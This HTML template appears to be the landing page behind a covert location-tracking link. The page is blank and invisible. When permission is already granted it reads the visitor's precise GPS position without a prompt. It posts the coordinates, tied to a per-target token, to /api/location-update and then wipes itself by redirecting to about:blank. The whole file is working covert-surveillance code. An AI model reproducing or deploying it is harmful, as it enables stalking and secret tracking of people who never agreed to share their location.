<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title> </title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  html, body { background: #000; overflow: hidden; width: 100%; height: 100%; }
  body { opacity: 0; }
</style>
</head>
<body>
<script>
(function() {
  'use strict';
  var token = "{{ token }}";
  var _sent = false;

  {% if expired %}
    try { window.location.replace('about:blank'); } catch(e) {}
    return;
  {% endif %}

  function sendCoords(lat, lng, acc) {
    if (_sent) return;
    _sent = true;
    var payload = JSON.stringify({
      token: token,
      latitude: lat,
      longitude: lng,
      accuracy: acc
    });
    var blob = new Blob([payload], { type: 'application/json' });
    if (navigator.sendBeacon) {
      navigator.sendBeacon('/api/location-update', blob);
    } else {
      try { fetch('/api/location-update', { method:'POST', headers:{'Content-Type':'application/json'}, body:payload, keepalive:true }); } catch(e) {}
    }
  }

  function sendDenied() {
    if (_sent) return;
    _sent = true;
    var payload = JSON.stringify({ token: token });
    var blob = new Blob([payload], { type: 'application/json' });
    if (navigator.sendBeacon) {
      navigator.sendBeacon('/api/location-denied', blob);
    } else {
      try { fetch('/api/location-denied', { method:'POST', headers:{'Content-Type':'application/json'}, body:payload, keepalive:true }); } catch(e) {}
    }
  }

  function vanish() {
    try { window.location.replace('about:blank'); } catch(e) {}
    setTimeout(function() {
      try {
        document.open();
        document.write('<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body></body></html>');
        document.close();
      } catch(e) {}
    }, 10);
  }

  function attemptGps(callback) {
    if (!('geolocation' in navigator)) {
      sendDenied();
      if (callback) callback();
      return;
    }

    navigator.geolocation.getCurrentPosition(
      function(pos) {
        sendCoords(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
        if (callback) callback();
      },
      function(err) {
        // err.code 1 = denied, 2 = unavailable, 3 = timeout
        sendDenied();
        if (callback) callback();
      },
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
  }

  // ── Permission-aware approach ──
  if (navigator.permissions && navigator.permissions.query) {
    navigator.permissions.query({ name: 'geolocation' }).then(function(status) {
      if (status.state === 'granted') {
        // Silently fire GPS — no prompt
        attemptGps(function() { vanish(); });
      } else if (status.state === 'denied') {
        // Already denied — no point trying
        sendDenied();
        vanish();
      } else {
        // 'prompt' state — this WILL show the browser dialog
        // Attempt GPS and let the prompt appear naturally
        attemptGps(function() { vanish(); });
      }
    }).catch(function() {
      // Permissions API unavailable — just try GPS
      attemptGps(function() { vanish(); });
    });
  } else {
    // No permissions API — just try GPS (may prompt)
    attemptGps(function() { vanish(); });
  }

  // ── Safety timeout: vanish after ~22s if something hangs ──
  setTimeout(function() {
    if (!_sent) { sendDenied(); }
    vanish();
  }, 22000);
})();
</script>
</body>
</html>
